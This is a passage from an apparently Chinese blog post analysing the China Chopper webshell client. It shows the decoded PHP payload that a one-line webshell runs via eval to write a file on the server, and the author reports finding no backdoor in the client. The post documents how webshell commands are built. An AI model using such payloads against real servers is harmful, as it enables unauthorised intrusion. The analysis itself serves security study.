z1=D:\WWW\www\NewFile.txt //新建文件保存路径 z2=test //新建文件内容 到这里我们才算真正将$_POST[’pass’]里的代码完全还原出来了。 @ini_set(“display_errors”,”0″); @set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);; echo @fwrite(fopen(“D:\WWW\www\NewFile.txt”,”w”),”test”)?”1″:”0″;; echo(“|&lt;-”);die(); eval执行的就是上面的代码。 其他如编辑，复制等操作也是一样的加密手法，我已经将他们全部还原成明文，并没有发现所谓的后门， 对菜刀客户端也进行了两个多小时的抓包监听，也无任何自动执行动作]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>一句话木马</tag>
        <tag>中国菜刀</tag>
        <tag>加密分析</tag>
        <tag>后门</tag>
      </tags>
  </entry>
</search>
